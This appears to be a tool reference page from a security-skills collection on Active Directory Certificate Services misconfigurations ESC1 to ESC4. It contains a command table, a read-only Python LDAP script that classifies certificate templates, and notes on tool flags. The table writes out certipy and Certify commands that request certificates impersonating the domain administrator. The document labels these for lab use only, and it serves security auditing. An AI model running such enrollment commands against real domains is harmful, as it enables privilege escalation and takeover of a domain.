# Tools, CLI Flags, and SDK Reference

> Sub-skill: [`active-directory-certificate-services-esc1-through-esc4`](SKILL.md) | Family: **Network, Active Directory and Endpoint**

Entry points verified against current releases. Impacket, Certipy and netexec rename subcommands between minor versions; check `--help` before scripting.

## Tool and Command Matrix

| Tool / Package | Verified Command or Entry Point | Purpose | Platforms |
|---|---|---|---|
| `certipy` | `certipy req -u lowpriv@corp.example -p pass -ca CORP-CA -template Corp-User -upn administrator@corp.example -dc-ip 10.20.30.10` | Request a certificate, authorised lab only | Linux / Windows |
| `Certify` | `Certify.exe request /ca:dc01\CORP-CA /template:Corp-User /altname:administrator` | Same from a Windows host, lab only | Windows |
| `certipy find` | `certipy find -u lowpriv@corp.example -p pass -dc-ip 10.20.30.10 -vulnerable` | Read-only ESC classification | Linux / Windows |
| `Get-ADObject` | `Get-ADObject -Filter {objectClass -eq 'pKICertificateTemplate'} -Properties msPKI-Certificate-Name-Flag,pKIExtendedKeyUsage` | Raw template attributes | Windows |
| `certutil` | `certutil -dstemplate Corp-User` | Template detail from the CA host | Windows |

## Minimal Lab Validation Script

Classify every published template into ESC1-ESC4 from attributes and ACLs, so the finding names a class and its deciding field.

```python
from ldap3 import Server, Connection, NTLM

BASE = "CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=corp,DC=example"
SUPPLY, CLIENT_AUTH, ENROLL_AGENT = 0x1, "1.3.6.1.5.5.7.3.2", "1.3.6.1.4.1.311.20.2.1"
srv = Server("10.20.30.10")
conn = Connection(srv, user="CORP\\lowpriv", password="pass", authentication=NTLM, auto_bind=True)
conn.search(BASE, "(objectClass=pKICertificateTemplate)",
            attributes=["cn", "msPKI-Certificate-Name-Flag", "pKIExtendedKeyUsage",
                        "msPKI-RA-Signature", "msPKI-Enrollment-Flag"])
for e in conn.entries:
    flag = int(e.msPKI_Certificate_Name_Flag.value or 0)
    eku = e.pKIExtendedKeyUsage.value or []
    ra = int(e.msPKI_RA_Signature.value or 0)
    approval = int(e.msPKI_Enrollment_Flag.value or 0) & 0x2
    classes = []
    if flag & SUPPLY and (CLIENT_AUTH in eku or "2.5.29.37.0" in eku) and not ra and not approval:
        classes.append("ESC1")
    if "2.5.29.37.0" in eku:
        classes.append("ESC2")
    if ENROLL_AGENT in eku:
        classes.append("ESC3")
    if classes:
        print(e.cn, classes, "ra_sig", ra, "approval", bool(approval))
```

## Flag Notes

- `-upn` sets the SAN on the request; only valid where the template allows enrollee-supplied subject.
- `-show-adcs` includes CA-level detail, which is needed to confirm publication.
- `-vulnerable` is the read-only form; `req` performs enrollment and changes CA state.
